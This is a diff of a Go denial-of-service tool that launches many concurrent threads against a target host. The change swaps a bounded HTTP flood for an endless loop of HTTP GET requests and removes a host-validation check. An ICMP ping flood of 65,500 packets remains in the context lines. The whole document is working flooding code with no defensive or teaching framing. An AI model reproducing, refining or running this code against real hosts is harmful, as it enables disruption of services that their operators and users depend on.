@@ -25,8 +25,7 @@ func main() {
 	for i := 0; i < threads; i++ {
 		wg.Add(1)
 
-		// go icmpFlood(target)
-		go httpFlood(target, 5000)
+		go httpGetFlood(target)
 	}
 	wg.Wait()
 }
@@ -53,15 +52,6 @@ func parseArgs() (target string, numbOfThreads int) {
 	return target, numbOfThreads
 }
 
-func isHostValid(host string) bool {
-	_, err := net.LookupHost(host)
-	if err != nil {
-		return true
-	} // Change to FALSE ONCE DONE.
-
-	return true
-}
-
 func areNumberOfThreadsValid(threads int) bool {
 	threads = int(threads)
 
@@ -82,17 +72,20 @@ func icmpFlood(target string) {
 	pinger.Count = 65500 // Packets to send
 	pinger.Run()         // Blocks until complete
 
-	wg.Done() // Decrement thread counter once complete
+	wg.Done() 			// Decrement thread counter once complete
 	fmt.Println("Ping Complete.")
 }
 
-func httpFlood(target string, numbOfRequests int) {
-	for i := 0; i < numbOfRequests; i++ {
+func httpGetFlood(target string) {
+	for {
 		resp, err := http.Get(target)
 
-		if err == nil {
-			fmt.Println(i, "- Target Hit - ", resp.StatusCode)
+		if err != nil {
+			fmt.Println("Error: Failed to hit host, please enter a valid one.")
+			os.Exit(1)
 		}
+		fmt.Println("Target Hit - ", resp.StatusCode)
+
 		resp.Body.Close()
 	}
 }
